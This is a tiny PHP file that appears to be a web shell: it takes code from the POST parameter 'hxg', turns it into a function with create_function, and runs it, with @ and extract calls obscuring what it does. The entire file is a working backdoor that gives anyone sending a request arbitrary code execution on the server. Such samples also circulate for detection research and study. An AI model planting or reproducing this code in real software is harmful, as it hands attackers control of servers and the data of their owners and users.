<><?php
function fun2(){
	$b=$_POST;
	return @($b[hxg]);
}
@extract(array(b=>create_function(NULL,fun2())));
@extract(array(c=>$b()));
?>